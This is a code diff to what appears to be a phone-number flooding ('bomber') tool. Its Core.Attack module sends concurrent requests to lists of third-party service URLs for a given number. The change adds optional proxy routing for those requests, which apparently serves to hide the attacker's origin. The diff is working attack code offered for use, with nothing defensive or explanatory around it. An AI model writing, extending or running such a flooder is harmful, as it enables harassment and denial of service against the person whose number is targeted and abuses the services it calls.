@@ -1,9 +1,10 @@
 from asyncio import ensure_future, gather, run
 from aiohttp import ClientSession
+from aiohttp_proxy import ProxyConnector, ProxyType
 
 from Core.Attack.Services import urls
 from Core.Attack.Feedback_Services import feedback_urls
-from Core.Config import check_config
+from Core.Config import check_config, PROXY
 
 
 
@@ -20,10 +21,17 @@ async def request(session, url):
 
 
 async def async_attacks(number):
-    async with ClientSession() as session:
-        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
-        tasks = [ensure_future(request(session, service)) for service in services]
-        await gather(*tasks)
+    if PROXY==None:
+        async with ClientSession() as session:
+            services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
+            tasks = [ensure_future(request(session, service)) for service in services]
+            await gather(*tasks)
+    else:
+        connector = ProxyConnector.from_url(PROXY)
+        async with ClientSession(connector) as session:
+            services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
+            tasks = [ensure_future(request(session, service)) for service in services]
+            await gather(*tasks)
 
 
 
